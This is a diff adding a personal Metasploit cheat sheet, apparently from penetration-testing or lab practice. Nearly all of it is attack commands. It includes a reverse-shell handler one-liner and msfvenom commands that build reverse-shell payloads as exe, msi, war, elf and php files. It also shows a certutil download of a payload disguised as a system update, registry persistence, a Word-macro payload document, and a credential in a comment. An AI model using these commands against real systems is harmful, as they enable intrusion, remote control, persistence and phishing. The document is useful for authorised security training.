@@ -1,0 +1,95 @@
+### init ###
+msfdb init					# if problem: msfdb --use-defaults delete
+						# then: msfdb --use-defaults init
+						# msf / fakv98423-_DOZEK
+db_status
+workspace -h
+db_nmap -sV -p 80 IP				#save result of nmap in db
+hosts -h
+services -h
+hosts -R					#add value to rhosts param
+
+
+### msf utils ###
+help						#help cmd
+show xxx					#show
+options						#module options (payload used)
+info
+use exploit/windows/xxx				#use an exploit
+info exploit/windows/xxx			#show info on a module
+show payloads					#show then use a different payloads
+	> set payload NUM			#use a different payload
+unset payload					#clear a set payload
+back						#leave context
+exploit -z					#run exploit and background the session
+sessions					#list all active sessions
+sessions -h
+sessions -i ID					#intereact with a session
+
+### one line ###
+msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.14.32.190; set LPORT 4444;exploit"
+
+### shell to meterpreter
+use post/multi/manage/shell_to_meterpreter
+
+
+### after exploit
+> shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+## convert a low meterpreter to proper tcp ##
+meterpreter > background
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.98.114 -f exe -o program.exe
+cmd.exe /C certutil -urlcache -split -f http://10.8.98.114/program.exe Service_system_update.exe
+sessions -i ?
+> "wait a shell section"
+meterpreter > execute Service_system_update.exe
+meterpreter > background
+sessions -i ?
+
+
+## wait a shell ##
+use multi/handler
+set payload windows/meterpreter/reverse_tcp				# win staged
+set payload windows/meterpreter_reverse_tcp				# win stageless
+set payload linux/x64/meterpreter/reverse_tcp				# linux staged
+set payload linux/x64/meterpreter_reverse_tcp				# linux stageless
+set lhost 10.8.98.114
+set lport 4444
+exploit -j
+
+
+## create shell ##
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.98.114 -f exe -o program.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.98.114 -f msi -o setup.msi
+msfvenom -p java/jsp_shell_reverse_tcp lhost=10.8.98.114 lport=4444 -f war -o exploit.war
+msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o shell LHOST=10.8.98.114 LPORT=4443
+msfvenom -p php/meterpreter_reverse_tcp lhost=10.8.98.114 lport=443 -o unstaged.php
+
+
+## persistence ##
+run exploit/windows/local/registry_persistence sleep_time=420 lport=1337 lhost=192.168.0.177
+
+
+## word macro
+msfconsole
+set payload windows/meterpreter/reverse_tcp
+use exploit/multi/fileformat/office_word_macro
+set LHOST xxx
+set LPORT 888
+exploit
+	[*] Using template: /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx
+	[*] Injecting payload in document comments
+	[*] Injecting macro and other required files in document
+	[*] Finalizing docm: msf.docm
+	[+] msf.docm stored at /home/tristan/.msf4/local/msf.docm
+
+
+
+
+
+
+
+
+
